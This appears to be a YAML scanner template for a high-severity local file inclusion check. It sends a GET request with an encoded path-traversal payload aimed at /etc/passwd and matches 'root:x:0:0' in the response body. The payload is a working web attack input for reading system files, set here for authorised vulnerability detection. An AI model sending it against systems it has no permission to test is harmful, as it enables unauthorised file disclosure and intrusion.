id: lfi-100
name: 'Path traversal via include'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads /etc/passwd via include'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      include:
        - '..%c0%af..%c0%afetc%c0%afpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
